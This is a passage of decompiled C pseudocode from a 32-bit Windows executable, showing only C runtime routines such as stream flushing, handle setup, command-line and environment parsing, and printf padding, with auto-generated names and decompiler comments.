  result = dword_415BB0++;
  funcs_404BE0[result] = a1;
  return result;
}
// 4086B0: using guessed type void __noreturn sub_4086B0(void);
// 415A6C: using guessed type int funcs_404BE0[80];
// 415BAC: using guessed type int dword_415BAC;
// 415BB0: using guessed type int dword_415BB0;

//----- (00405C10) --------------------------------------------------------
int __cdecl sub_405C10(int a1)
{
  _BYTE *i; // esi
  int v3; // eax
  int v4; // esi
  int v5; // [esp-8h] [ebp-Ch]
  int j; // [esp-4h] [ebp-8h]

  if ( a1 )
  {
    if ( (*(_WORD *)a1 & 0x2000) != 0 )
    {
      for ( i = *(_BYTE **)(a1 + 8); (unsigned int)i < *(_DWORD *)(a1 + 16); i += v3 )
      {
        v3 = sub_4086D0(*(_DWORD *)(a1 + 4), i, *(_DWORD *)(a1 + 16) - (_DWORD)i);
        if ( v3 <= 0 )
        {
          *(_DWORD *)(a1 + 16) = *(_DWORD *)(a1 + 8);
          *(_DWORD *)(a1 + 24) = *(_DWORD *)(a1 + 8);
          *(_DWORD *)(a1 + 48) = *(_DWORD *)(a1 + 8);
          *(_WORD *)a1 |= 0x200u;
          return -1;
        }
      }
      *(_DWORD *)(a1 + 16) = *(_DWORD *)(a1 + 8);
      if ( (*(_WORD *)a1 & 0xC00) != 0 )
        v4 = *(_DWORD *)(a1 + 8);
      else
        v4 = *(_DWORD *)(a1 + 12);
      if ( (*(_WORD *)a1 & 0x4000) != 0 )
        *(_DWORD *)(a1 + 24) = v4;
      else
        *(_DWORD *)(a1 + 48) = v4;
      return 0;
    }
    else
    {
      return 0;
    }
  }
  else
  {
    v5 = 0;
    for ( j = 0; j < 256; ++j )
    {
      if ( *(&off_415EA0 + j) )
      {
        if ( sub_405C10(*(&off_415EA0 + j)) < 0 )
          v5 = -1;
      }
    }
    return v5;
  }
}

//----- (00405CE0) --------------------------------------------------------
int __cdecl sub_405CE0(int a1)
{
  void *v2; // eax
  int LastError; // esi
  int v4; // [esp-4h] [ebp-8h]

  if ( a1 < uNumber && (*((_BYTE *)*(&lpMem + (a1 >> 5)) + 8 * (a1 & 0x1F) + 4) & 1) != 0 )
  {
    if ( sub_408B00(a1) == -1
      || (a1 == 1 || a1 == 2) && (v4 = sub_408B00(1), v4 == sub_408B00(2))
      || (v2 = (void *)sub_408B00(a1), CloseHandle(v2)) )
    {
      LastError = 0;
    }
    else
    {
      LastError = GetLastError();
    }
    sub_4089C0(a1);
    *((_BYTE *)*(&lpMem + (a1 >> 5)) + 8 * (a1 & 0x1F) + 4) = 0;
    if ( LastError )
    {
      sub_408C30(LastError);
      return -1;
    }
    else
    {
      return 0;
    }
  }
  else
  {
    dword_415C84 = 9;
    return -1;
  }
}
// 415C84: using guessed type int dword_415C84;

//----- (00405DB0) --------------------------------------------------------
int __cdecl sub_405DB0(LPCSTR lpFileName)
{
  return sub_408DA0(lpFileName);
}

//----- (00405DC0) --------------------------------------------------------
void __cdecl __noreturn sub_405DC0(UINT uExitCode)
{
  ExitProcess(uExitCode);
}

//----- (00405DD8) --------------------------------------------------------
int __cdecl sub_405DD8(int a1, int a2, int a3)
{
  int *v3; // ebp
  int v4; // ebx
  int v5; // esi
  int v6; // edi
  int v7; // eax
  int v8; // edi
  int v9; // ecx
  int v11[2]; // [esp+10h] [ebp-8h] BYREF
  int savedregs; // [esp+18h] [ebp+0h] BYREF

  v3 = &savedregs;
  v4 = a2;
  if ( (*(_DWORD *)(a1 + 4) & 6) != 0 )
  {
    sub_405F10(a2 + 16, a2, -1);
  }
  else
  {
    v11[0] = a1;
    v11[1] = a3;
    *(_DWORD *)(a2 - 4) = v11;
    v5 = *(_DWORD *)(a2 + 12);
    v6 = *(_DWORD *)(a2 + 8);
    while ( v5 != -1 )
    {
      if ( *(_DWORD *)(v6 + 12 * v5 + 4) )
      {
        v7 = (*(int (**)(void))(v6 + 12 * v5 + 4))();
        v4 = v3[3];
        if ( v7 )
        {
          if ( v7 < 0 )
            return 0;
          v8 = *(_DWORD *)(v4 + 8);
          sub_405EC0((void *)v3[3]);
          v3 = (int *)(v4 + 16);
          sub_405F10(v4 + 16, v4, v5);
          sub_405FCC(*(_DWORD *)(v8 + 12 * v5 + 8), v4 + 16, 1);
          *(_DWORD *)(v4 + 12) = *(_DWORD *)(v8 + 4 * v9);
          (*(void (**)(void))(v8 + 4 * v9 + 8))();
        }
      }
      v6 = *(_DWORD *)(v4 + 8);
      v5 = *(_DWORD *)(v6 + 12 * v5);
    }
  }
  return 1;
}
// 405E61: variable 'v9' is possibly undefined

//----- (00405EC0) --------------------------------------------------------
void __cdecl sub_405EC0(void *a1)
{
  RtlUnwind(a1, &loc_405ED8, 0, 0);
}

//----- (00405EE0) --------------------------------------------------------
int __cdecl sub_405EE0(int a1, int a2, int a3, _DWORD *a4)
{
  int result; // eax

  result = 1;
  if ( (*(_DWORD *)(a1 + 4) & 6) != 0 )
  {
    *a4 = a2;
    return 3;
  }
  return result;
}

//----- (00405F10) --------------------------------------------------------
int __usercall sub_405F10@<eax>(int a1@<ebp>, int a2, int a3)
{
  int result; // eax
  int v4; // ebx
  int v5; // esi
  int v6; // esi
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-8h] [ebp-1Ch]
  int (__cdecl *v8)(int, int, int, _DWORD *); // [esp-4h] [ebp-18h]

  v8 = sub_405EE0;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  while ( 1 )
  {
    result = a2;
    v4 = *(_DWORD *)(a2 + 8);
    v5 = *(_DWORD *)(a2 + 12);
    if ( v5 == -1 || v5 == a3 )
      break;
    v6 = 3 * v5;
    *(_DWORD *)(a2 + 12) = *(_DWORD *)(v4 + 4 * v6);
    if ( !*(_DWORD *)(v4 + 4 * v6 + 4) )
    {
      sub_405FCC(*(_DWORD *)(v4 + 4 * v6 + 8), a1, 257);
      (*(void (__cdecl **)(struct _EXCEPTION_REGISTRATION_RECORD *, int (__cdecl *)(int, int, int, _DWORD *)))(v4 + 4 * v6 + 8))(
        ExceptionList,
        v8);
    }
  }
  return result;
}
// 405F6A: variable 'ExceptionList' is possibly undefined
// 405F6A: variable 'v8' is possibly undefined

//----- (00405F90) --------------------------------------------------------
BOOL sub_405F90()
{
  BOOL result; // eax
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // ecx

  result = 0;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  if ( (int (__cdecl *)(int, int, int, _DWORD *))ExceptionList->Handler == sub_405EE0 )
    return ExceptionList[1].Next == (struct _EXCEPTION_REGISTRATION_RECORD *)*((_DWORD *)ExceptionList[1].Handler + 3);
  return result;
}

//----- (00405FC0) --------------------------------------------------------
void __stdcall sub_405FC0(int a1)
{
  JUMPOUT(0x405FD6);
}
// 405FC7: control flows out of bounds to 405FD6

//----- (00405FCC) --------------------------------------------------------
int __userpurge sub_405FCC@<eax>(int result@<eax>, int a2@<ebp>, int a3)
{
  dword_4162A0[2] = *(_DWORD *)(a2 + 8);
  dword_4162A0[1] = result;
  dword_4162A0[3] = a2;
  return result;
}
// 4162A0: using guessed type _DWORD dword_4162A0[4];

//----- (00405FF0) --------------------------------------------------------
void sub_405FF0()
{
  GetSystemTimeAsFileTime(&SystemTimeAsFileTime);
}

//----- (00406050) --------------------------------------------------------
UINT sub_406050()
{
  char *v0; // eax
  char *v1; // ebx
  unsigned int v2; // kr00_4
  int v3; // esi
  char *v4; // eax
  char *v5; // ebx
  int i; // edi
  char *v7; // ebx
  int j; // edi
  char *v9; // ebx
  HANDLE v10; // eax
  HANDLE CurrentProcess; // [esp-64h] [ebp-68h]
  HANDLE v13; // [esp-60h] [ebp-64h] BYREF
  DWORD v14; // [esp-5Ch] [ebp-60h]
  struct _STARTUPINFOA v15; // [esp-58h] [ebp-5Ch] BYREF
  DWORD FileType; // [esp-14h] [ebp-18h]
  int v17; // [esp-10h] [ebp-14h]
  HANDLE StdHandle; // [esp-Ch] [ebp-10h]
  HANDLE *v19; // [esp-8h] [ebp-Ch]
  LPBYTE v20; // [esp-4h] [ebp-8h]

  v0 = (char *)sub_403DC0(0x100u);
  v1 = v0;
  if ( !v0 )
    sub_405DC0(1u);
  lpMem = v0;
  uNumber = 32;
  while ( v1 < (char *)lpMem + 256 )
  {
    v1[4] = 0;
    *(_DWORD *)v1 = -1;
    v1[5] = 10;
    v1 += 8;
  }
  GetStartupInfoA(&v15);
  if ( v15.cbReserved2 && v15.lpReserved2 )
  {
    v17 = *(_DWORD *)v15.lpReserved2;
    v20 = v15.lpReserved2 + 4;
    v19 = (HANDLE *)&v15.lpReserved2[v17 + 4];
    if ( v17 > 2048 )
      v17 = 2048;
    v2 = __readeflags();
    v3 = 1;
    __writeeflags(v2);
    while ( (int)uNumber < v17 )
    {
      v4 = (char *)sub_403DC0(0x100u);
      v5 = v4;
      if ( !v4 )
      {
        v17 = uNumber;
        break;
      }
      *(&lpMem + v3) = v4;
      uNumber += 32;
      while ( v5 < (char *)*(&lpMem + v3) + 256 )
      {
        v5[4] = 0;
        *(_DWORD *)v5 = -1;
        v5[5] = 10;
        v5 += 8;
      }
      ++v3;
    }
    for ( i = 0; i < v17; ++i )
    {
      if ( *v19 != (HANDLE)-1 && (*v20 & 1) != 0 && ((*v20 & 8) != 0 || GetFileType(*v19)) )
      {
        v7 = (char *)*(&lpMem + (i >> 5)) + 8 * (i & 0x1F);
        *(_DWORD *)v7 = *v19;
        v7[4] = *v20;
      }
      ++v20;
      ++v19;
    }
  }
  for ( j = 0; j < 3; ++j )
  {
    v9 = (char *)lpMem + 8 * j;
    if ( *(_DWORD *)v9 == -1 )
    {
      v9[4] = -127;
      if ( j )
        v14 = (j == 1) - 12;
      else
        v14 = -10;
      StdHandle = GetStdHandle(v14);
      if ( StdHandle == (HANDLE)-1 || (FileType = GetFileType(StdHandle)) == 0 )
      {
        v9[4] |= 0x40u;
      }
      else
      {
        CurrentProcess = GetCurrentProcess();
        v10 = GetCurrentProcess();
        if ( DuplicateHandle(CurrentProcess, StdHandle, v10, &v13, 0, 1, 2u) )
          StdHandle = v13;
        *(_DWORD *)v9 = StdHandle;
        if ( (unsigned __int8)FileType == 2 )
        {
          v9[4] |= 0x40u;
        }
        else if ( (unsigned __int8)FileType == 3 )
        {
          v9[4] |= 8u;
        }
      }
    }
    else
    {
      v9[4] |= 0x80u;
    }
  }
  return SetHandleCount(uNumber);
}

//----- (004062A0) --------------------------------------------------------
void sub_4062A0()
{
  int i; // ebx

  for ( i = 0; i < 64; ++i )
  {
    if ( *(&lpMem + i) )
    {
      sub_404670((char *)*(&lpMem + i));
      *(&lpMem + i) = 0;
    }
  }
}

//----- (004062D0) --------------------------------------------------------
_DWORD *__cdecl sub_4062D0(unsigned __int8 *a1, unsigned __int8 **a2, unsigned __int8 *a3, _DWORD *a4, _DWORD *a5)
{
  unsigned __int8 *v5; // ebx
  unsigned __int8 *v6; // esi
  unsigned __int8 **v7; // eax
  unsigned __int8 *v8; // eax
  unsigned __int8 *v9; // eax
  unsigned __int8 *v10; // eax
  unsigned __int8 *v11; // eax
  int v12; // eax
  unsigned __int8 **v13; // eax
  unsigned int v14; // ecx
  unsigned __int8 *v15; // eax
  int v17; // eax
  unsigned __int8 *v18; // eax
  unsigned __int8 *v19; // eax
  _DWORD *result; // eax
  unsigned __int8 v21; // [esp+Fh] [ebp-9h]
  BOOL v22; // [esp+10h] [ebp-8h]
  int v23; // [esp+14h] [ebp-4h]

  v5 = a3;
  *a5 = 0;
  *a4 = 1;
  v6 = a1;
  v7 = a2;
  if ( a2 )
  {
    ++a2;
    *v7 = a3;
  }
  if ( *a1 == 34 )
  {
    while ( *++v6 != 34 && *v6 )
    {
      if ( v5 )
      {
        v8 = v5++;
        *v8 = *v6;
      }
      ++*a5;
    }
    if ( v5 )
    {
      v9 = v5++;
      *v9 = 0;
    }
    ++*a5;
    if ( *v6 == 34 )
      ++v6;
  }
  else
  {
    do
    {
      if ( v5 )
      {
        v10 = v5++;
        *v10 = *v6;
      }
      ++*a5;
      v11 = v6++;
      v21 = *v11;
    }
    while ( *v11 != 32 && v21 && v21 != 9 );
    if ( v21 )
    {
      if ( v5 )
        *(v5 - 1) = 0;
    }
    else
    {
      --v6;
    }
  }
  v22 = 0;
  while ( 1 )
  {
    if ( *v6 )
    {
      while ( 1 )
      {
        v12 = *v6;
        if ( v12 != 32 && v12 != 9 )
          break;
        ++v6;
      }
    }
    if ( !*v6 )
      break;
    v13 = a2;
    if ( a2 )
    {
      ++a2;
      *v13 = v5;
    }
    ++*a4;
    while ( 1 )
    {
      v23 = 1;
      v14 = 0;
      while ( *v6 == 92 )
      {
        ++v6;
        ++v14;
      }
      if ( *v6 == 34 )
      {
        if ( (v14 & 1) == 0 )
        {
          if ( v22 )
          {
            if ( v6[1] == 34 )
              ++v6;
            else
              v23 = 0;
          }
          else
          {
            v23 = 0;
          }
          v22 = !v22;
        }
        v14 >>= 1;
      }
      while ( v14-- )
      {
        if ( v5 )
        {
          v15 = v5++;
          *v15 = 92;
        }
        ++*a5;
      }
      v17 = *v6;
      if ( !*v6 || !v22 && (v17 == 32 || v17 == 9) )
        break;
      if ( v23 )
      {
        if ( v5 )
        {
          v18 = v5++;
          *v18 = *v6;
        }
        ++*a5;
      }
      ++v6;
    }
    if ( v5 )
    {
      v19 = v5++;
      *v19 = 0;
    }
    ++*a5;
  }
  if ( a2 )
    *a2 = 0;
  result = a4;
  ++*a4;
  return result;
}

//----- (00406490) --------------------------------------------------------
int sub_406490()
{
  LPSTR CommandLineA; // esi
  unsigned __int8 **v1; // eax
  int v2; // ebx
  int result; // eax
  CHAR v4[260]; // [esp-10Ch] [ebp-110h] BYREF
  int v5; // [esp-8h] [ebp-Ch] BYREF
  _DWORD v6[2]; // [esp-4h] [ebp-8h] BYREF

  CommandLineA = GetCommandLineA();
  if ( !*CommandLineA )
  {
    GetModuleFileNameA(0, v4, 0x104u);
    CommandLineA = v4;
  }
  sub_4062D0((unsigned __int8 *)CommandLineA, 0, 0, v6, &v5);
  v1 = (unsigned __int8 **)sub_403DC0(v5 + 4 * v6[0]);
  v2 = (int)v1;
  if ( !v1 )
    sub_405DC0(1u);
  sub_4062D0((unsigned __int8 *)CommandLineA, v1, (unsigned __int8 *)&v1[v6[0]], v6, &v5);
  result = v6[0] - 1;
  dword_415BB4 = v6[0] - 1;
  dword_415BB8 = v2;
  return result;
}
// 415BB4: using guessed type int dword_415BB4;
// 415BB8: using guessed type int dword_415BB8;

//----- (00406530) --------------------------------------------------------
BOOL sub_406530()
{
  CHAR *i; // ebx
  int v1; // eax
  int v2; // esi
  char *v3; // edi
  const char *j; // ebx
  int v5; // eax
  int v6; // esi
  BOOL result; // eax
  CHAR *penv; // [esp+Ch] [ebp-8h]
  int v9; // [esp+10h] [ebp-4h]

  penv = GetEnvironmentStrings();
  if ( !penv )
    penv = (CHAR *)off_4162B0;
  v9 = 0;
  for ( i = penv; *i; i += v2 )
  {
    v1 = -1;
    do
      ++v1;
    while ( i[v1] );
    v2 = v1 + 1;
    if ( *i != 61 )
      v9 += v2;
  }
  v3 = (char *)sub_403DC0(v9 + 1);
  dword_415BC0 = (int)v3;
  if ( !v3 )
    sub_405DC0(1u);
  for ( j = penv; *j; j += v6 )
  {
    v5 = -1;
    do
      ++v5;
    while ( j[v5] );
    v6 = v5 + 1;
    if ( *j != 61 )
    {
      strcpy(v3, j);
      v3 += v6;
    }
  }
  *v3 = 0;
  result = (BOOL)penv;
  if ( penv != off_4162B0 )
    return FreeEnvironmentStringsA(penv);
  return result;
}
// 415BC0: using guessed type int dword_415BC0;
// 4162B0: using guessed type void *off_4162B0;

//----- (004065F0) --------------------------------------------------------
LPSTR sub_4065F0()
{
  LPSTR CommandLineA; // ebx

  CommandLineA = GetCommandLineA();
  if ( *CommandLineA == 34 )
  {
    do
      ++CommandLineA;
    while ( *CommandLineA != 34 && *CommandLineA );
    if ( *CommandLineA == 34 )
      ++CommandLineA;
  }
  else
  {
    while ( (unsigned __int8)*CommandLineA > 0x20u )
      ++CommandLineA;
  }
  while ( *CommandLineA && (unsigned __int8)*CommandLineA <= 0x20u )
    ++CommandLineA;
  return CommandLineA;
}

//----- (00406630) --------------------------------------------------------
LONG __cdecl sub_406630(void *a1, struct _EXCEPTION_POINTERS *ExceptionInfo)
{
  void **i; // esi
  int v3; // eax
  void (__cdecl *v4)(void *); // edi

  for ( i = (void **)&unk_4162B4; ; i += 2 )
  {
    if ( i >= &off_416304 )
      return UnhandledExceptionFilter(ExceptionInfo);
    if ( *i == a1 )
      break;
  }
  v3 = sub_404B60((int)i[1], 1);
  v4 = (void (__cdecl *)(void *))v3;
  if ( v3 == -1 || !v3 )
    return UnhandledExceptionFilter(ExceptionInfo);
  if ( v3 != 1 )
  {
    sub_404B60((int)i[1], 0);
    v4(i[1]);
  }
  return -1;
}
// 416304: using guessed type void *off_416304;

//----- (004066A0) --------------------------------------------------------
int __cdecl sub_4066A0(unsigned __int16 *a1, char *a2, int a3, int a4)
{
  int v6; // [esp+8h] [ebp-14h]
  __int16 v7; // [esp+Eh] [ebp-Eh]
  int v9; // [esp+10h] [ebp-Ch]
  char *v10; // [esp+14h] [ebp-8h]
  unsigned __int8 v11; // [esp+19h] [ebp-3h]
  unsigned __int16 v12; // [esp+1Ah] [ebp-2h]

  v11 = *(_WORD *)(a4 + 6);
  v10 = a2;
  v12 = *(_DWORD *)a4;
  if ( off_416394 )
  {
    v9 = 0;
    if ( a2 )
    {
      do
      {
        if ( !a3 )
        {
          *(_DWORD *)a4 = v12;
          *(_WORD *)(a4 + 6) = v11;
          return -2;
        }
        if ( v11 >= 0x10u
          || (v6 = (int)*(&off_416394 + v11)) == 0
          || (++v9, v9 >= 4080)
          || (v7 = *(_WORD *)(v6 + 2 * (unsigned __int8)*v10)) == 0 )
        {
          dword_415C84 = 42;
          return -1;
        }
        v11 = (unsigned __int16)(v7 & 0xF00) >> 8;
        if ( (v7 & 0x8000) != 0 )
          v12 = (unsigned __int8)v7 | v12 & 0xFF00;
        if ( (v7 & 0x1000) != 0 )
          v12 = HIBYTE(v12) | (unsigned __int16)(v12 << 8);
        if ( (v7 & 0x4000) != 0 && *v10 )
        {
          ++v10;
          --a3;
          v9 = 0;
        }
      }
      while ( (v7 & 0x2000) == 0 );
      if ( a1 )
        *a1 = v12;
      *(_DWORD *)a4 = v12;
      *(_WORD *)(a4 + 6) = v11;
      if ( v12 )
        return v10 - a2;
      else
        return 0;
    }
    else
    {
      *(_DWORD *)a4 = 0;
      *(_DWORD *)(a4 + 4) = 0;
      return *(_WORD *)off_416394 & 0xF00;
    }
  }
  else if ( a2 )
  {
    while ( 1 )
    {
      if ( !a3 )
      {
        *(_DWORD *)a4 = v12;
        *(_WORD *)(a4 + 6) = v11;
        return -2;
      }
      if ( v11 )
      {
        if ( (*v10 & 0xC0) != 128 )
        {
          dword_415C84 = 42;
          return -1;
        }
        v12 = *v10 & 0x3F | (v12 << 6);
        --v11;
      }
      else if ( *v10 < 0 )
      {
        if ( (*v10 & 0xE0) == 192 )
        {
          v12 = *v10 & 0x1F;
          v11 = 1;
        }
        else
        {
          if ( (*v10 & 0xF0) != 224 )
          {
            dword_415C84 = 42;
            return -1;
          }
          v12 = *v10 & 0xF;
          v11 = 2;
        }
      }
      else
      {
        v12 = (unsigned __int8)*v10;
      }
      if ( !v11 )
        break;
      ++v10;
      --a3;
    }
    if ( a1 )
      *a1 = v12;
    *(_WORD *)(a4 + 6) = 0;
    if ( v12 )
      return v10 + 1 - a2;
    else
      return 0;
  }
  else
  {
    *(_DWORD *)a4 = 0;
    *(_DWORD *)(a4 + 4) = 0;
    return 0;
  }
}
// 415C84: using guessed type int dword_415C84;
// 416394: using guessed type void *off_416394;

//----- (00406990) --------------------------------------------------------
int __cdecl sub_406990(int a1, int *a2, unsigned __int8 a3, int a4)
{
  int v4; // ecx
  int v5; // ecx
  int v6; // ecx
  int v7; // ecx
  int v8; // eax
  int v9; // edx
  int v10; // edx
  int v11; // edx
  int v12; // edx
  unsigned __int8 v14; // [esp+14h] [ebp-48h]
  int v15; // [esp+24h] [ebp-38h]
  int v16; // [esp+28h] [ebp-34h]
  int v17; // [esp+2Ch] [ebp-30h]
  int v18; // [esp+30h] [ebp-2Ch]
  int v19; // [esp+34h] [ebp-28h]
  int v20; // [esp+38h] [ebp-24h]

  if ( a3 < 0x41u )
  {
    if ( a3 == 37 )
    {
      v11 = *(_DWORD *)(a1 + 20);
      *(_DWORD *)(a1 + 20) = v11 + 1;
      *(_BYTE *)(a4 + v11) = 37;
      return 0;
    }
    goto LABEL_34;
  }
  if ( a3 <= 0x47u )
    __asm { jmp     ds:dword_411BD8[eax*4] }
  if ( a3 != 88 )
  {
    if ( a3 >= 0x61u && a3 <= 0x78u )
      __asm { jmp     ds:dword_411B74[eax*4] }
LABEL_34:
    v12 = *(_DWORD *)(a1 + 20);
    *(_DWORD *)(a1 + 20) = v12 + 1;
    if ( a3 )
      v14 = a3;
    else
      v14 = 37;
    *(_BYTE *)(a4 + v12) = v14;
    return 0;
  }
  if ( *(_BYTE *)(a1 + 58) == 108 )
  {
    v4 = *a2 + 4;
    *a2 = v4;
    v19 = *(_DWORD *)(v4 - 4);
    v20 = 0;
  }
  else
  {
    if ( *(_BYTE *)(a1 + 58) == 113 )
    {
      v5 = *a2 + 8;
      *a2 = v5;
      v17 = *(_DWORD *)(v5 - 8);
      v18 = *(_DWORD *)(v5 - 4);
    }
    else
    {
      if ( *(_BYTE *)(a1 + 58) == 106 )
      {
        v6 = *a2 + 8;
        *a2 = v6;
        v15 = *(_DWORD *)(v6 - 8);
        v16 = *(_DWORD *)(v6 - 4);
      }
      else
      {
        v7 = *a2 + 4;
        *a2 = v7;
        v15 = *(_DWORD *)(v7 - 4);
        v16 = 0;
      }
      v17 = v15;
      v18 = v16;
    }
    v19 = v17;
    v20 = v18;
  }
  *(_DWORD *)a1 = v19;
  *(_DWORD *)(a1 + 4) = v20;
  if ( *(_BYTE *)(a1 + 58) == 104 )
  {
    *(_QWORD *)a1 = (unsigned __int16)*(_DWORD *)a1;
  }
  else if ( *(_BYTE *)(a1 + 58) == 98 )
  {
    *(_QWORD *)a1 = (unsigned __int8)*(_DWORD *)a1;
  }
  else
  {
    v8 = *(unsigned __int8 *)(a1 + 58);
    if ( v8 == 116 || v8 == 122 )
    {
      *(_DWORD *)a1 = *(_DWORD *)a1;
      *(_DWORD *)(a1 + 4) = 0;
    }
  }
  if ( (*(_WORD *)(a1 + 56) & 8) != 0 && (*(_DWORD *)(a1 + 4) || *(_DWORD *)a1) && (a3 == 120 || a3 == 88) )
  {
    v9 = *(_DWORD *)(a1 + 20);
    *(_DWORD *)(a1 + 20) = v9 + 1;
    *(_BYTE *)(a4 + v9) = 48;
    v10 = *(_DWORD *)(a1 + 20);
    *(_DWORD *)(a1 + 20) = v10 + 1;
    *(_BYTE *)(a4 + v10) = a3;
  }
  *(_DWORD *)(a1 + 16) = a4 + *(_DWORD *)(a1 + 20);
  sub_408F40(a1, a3);
  return 0;
}

//----- (004070F0) --------------------------------------------------------
int __cdecl sub_4070F0(int a1, int a2)
{
  int i; // esi
  int v3; // eax
  int v5; // eax
  int j; // esi
  int v7; // eax
  int v8; // eax
  int k; // esi
  int v10; // eax
  int v11; // eax
  int m; // esi
  int v13; // eax
  int n; // esi
  int v15; // eax
  int v16; // [esp+Ch] [ebp-8h]
  int v17; // [esp+Ch] [ebp-8h]
  int v18; // [esp+Ch] [ebp-8h]
  int v19; // [esp+Ch] [ebp-8h]
  int v20; // [esp+Ch] [ebp-8h]
  int v21; // [esp+10h] [ebp-4h]

  v21 = *(_DWORD *)(a1 + 52)
      - *(_DWORD *)(a1 + 20)
      - *(_DWORD *)(a1 + 24)
      - *(_DWORD *)(a1 + 28)
      - *(_DWORD *)(a1 + 32)
      - *(_DWORD *)(a1 + 36)
      - *(_DWORD *)(a1 + 40);
  if ( (*(_WORD *)(a1 + 56) & 4) == 0 && v21 > 0 )
  {
    for ( i = *(_DWORD *)(a1 + 52)
            - *(_DWORD *)(a1 + 20)
            - *(_DWORD *)(a1 + 24)
            - *(_DWORD *)(a1 + 28)
            - *(_DWORD *)(a1 + 32)
            - *(_DWORD *)(a1 + 36)
            - *(_DWORD *)(a1 + 40); i > 0; i -= v16 )
    {
      if ( (unsigned int)i <= 0x20 )
        v16 = i;
      else
        v16 = 32;
      v3 = (*(int (__cdecl **)(_DWORD, const char *, int))(a1 + 8))(
             *(_DWORD *)(a1 + 12),
             "                                ",
             v16);
      *(_DWORD *)(a1 + 12) = v3;
      if ( !v3 )
        return -1;
      *(_DWORD *)(a1 + 48) += v16;
    }
  }
  if ( *(int *)(a1 + 20) > 0 )
  {
    v5 = (*(int (__cdecl **)(_DWORD, int, _DWORD))(a1 + 8))(*(_DWORD *)(a1 + 12), a2, *(_DWORD *)(a1 + 20));
    *(_DWORD *)(a1 + 12) = v5;
    if ( !v5 )
      return -1;
    *(_DWORD *)(a1 + 48) += *(_DWORD *)(a1 + 20);
  }
  if ( *(int *)(a1 + 24) > 0 )
  {
    for ( j = *(_DWORD *)(a1 + 24); j > 0; j -= v17 )
    {
      if ( (unsigned int)j <= 0x20 )
        v17 = j;
      else
        v17 = 32;
      v7 = (*(int (__cdecl **)(_DWORD, const char *, int))(a1 + 8))(
             *(_DWORD *)(a1 + 12),
             "00000000000000000000000000000000",
             v17);
      *(_DWORD *)(a1 + 12) = v7;
      if ( !v7 )
        return -1;
      *(_DWORD *)(a1 + 48) += v17;
    }
  }
  if ( *(int *)(a1 + 28) > 0 )
  {
    v8 = (*(int (__cdecl **)(_DWORD, _DWORD, _DWORD))(a1 + 8))(
           *(_DWORD *)(a1 + 12),
           *(_DWORD *)(a1 + 16),
           *(_DWORD *)(a1 + 28));
    *(_DWORD *)(a1 + 12) = v8;
    if ( !v8 )
      return -1;
    *(_DWORD *)(a1 + 48) += *(_DWORD *)(a1 + 28);
  }
  if ( *(int *)(a1 + 32) > 0 )
  {
    for ( k = *(_DWORD *)(a1 + 32); k > 0; k -= v18 )
    {
      if ( (unsigned int)k <= 0x20 )
        v18 = k;
      else
        v18 = 32;
      v10 = (*(int (__cdecl **)(_DWORD, const char *, int))(a1 + 8))(
              *(_DWORD *)(a1 + 12),
              "00000000000000000000000000000000",
              v18);
      *(_DWORD *)(a1 + 12) = v10;
      if ( !v10 )
        return -1;
      *(_DWORD *)(a1 + 48) += v18;
    }
  }
  if ( *(int *)(a1 + 36) > 0 )
  {
    v11 = (*(int (__cdecl **)(_DWORD, int, _DWORD))(a1 + 8))(
            *(_DWORD *)(a1 + 12),
            *(_DWORD *)(a1 + 16) + *(_DWORD *)(a1 + 28),
            *(_DWORD *)(a1 + 36));
    *(_DWORD *)(a1 + 12) = v11;
    if ( !v11 )
      return -1;
    *(_DWORD *)(a1 + 48) += *(_DWORD *)(a1 + 36);
  }
  if ( *(int *)(a1 + 40) > 0 )
  {
    for ( m = *(_DWORD *)(a1 + 40); m > 0; m -= v19 )
    {
      if ( (unsigned int)m <= 0x20 )
        v19 = m;
      else
        v19 = 32;
      v13 = (*(int (__cdecl **)(_DWORD, const char *, int))(a1 + 8))(
              *(_DWORD *)(a1 + 12),
              "00000000000000000000000000000000",
              v19);
      *(_DWORD *)(a1 + 12) = v13;
      if ( !v13 )
        return -1;
      *(_DWORD *)(a1 + 48) += v19;
    }
  }
  if ( (*(_WORD *)(a1 + 56) & 4) != 0 && v21 > 0 )
  {
    for ( n = v21; n > 0; n -= v20 )
    {
      if ( (unsigned int)n <= 0x20 )
        v20 = n;
      else
        v20 = 32;
      v15 = (*(int (__cdecl **)(_DWORD, const char *, int))(a1 + 8))(
              *(_DWORD *)(a1 + 12),
              "                                ",
              v20);
      *(_DWORD *)(a1 + 12) = v15;
      if ( !v15 )
        return -1;
      *(_DWORD *)(a1 + 48) += v20;
    }
  }
  return 0;
}
// 407143: conditional instruction was optimized away because %var_8.4 is in (1..20)
// 4071C9: conditional instruction was optimized away because %var_8.4 is in (1..20)
// 40724F: conditional instruction was optimized away because %var_8.4 is in (1..20)
// 4072DA: conditional instruction was optimized away because %var_8.4 is in (1..20)
// 407337: conditional instruction was optimized away because %var_8.4 is in (1..20)

//----- (00407370) --------------------------------------------------------
int __cdecl sub_407370(const CHAR *a1, char a2)
{
  int v2; // esi
  int v3; // esi

  v2 = dword_411DA4[a2 & 3];
  if ( (a2 & 4) != 0 )
    v2 |= 8u;
  if ( (a2 & 8) != 0 )
    v2 |= 0x200u;
  if ( (a2 & 0x10) != 0 )
    v2 |= 0x100u;
  if ( (a2 & 0x20) != 0 )
    v3 = v2 | 0x8000;
  else
    v3 = v2 | 0x4000;
  return sub_409850(v3, a1, v3, 384);
}
// 411DA4: using guessed type int dword_411DA4[4];

//----- (004073E0) --------------------------------------------------------
int __cdecl sub_4073E0(unsigned __int8 *a1)
{
  int v1; // eax
  int v2; // edi
  unsigned __int8 *i; // esi
  int v5; // eax

  v1 = -1;
  do
    ++v1;
  while ( a1[v1] );
  v2 = v1;
  if ( dword_415BC0 )
  {
    for ( i = (unsigned __int8 *)dword_415BC0; *i; i += v5 + 1 )
    {
      if ( !sub_409C40(i, a1, v2) && i[v2] == 61 )
        return (int)&i[v2 + 1];
      v5 = -1;
      do
        ++v5;
      while ( i[v5] );
    }
  }
  return 0;
}
// 415BC0: using guessed type int dword_415BC0;

//----- (00407440) --------------------------------------------------------
int __cdecl sub_407440(int a1, unsigned __int16 *a2, __int16 a3)
{
  __int16 v4; // [esp+10h] [ebp+Ch]

  if ( !a2[1] )
    return 0;
  v4 = a2[4] + a3;
  if ( v4 < 0 )
    v4 = 0;
  if ( *a2 )
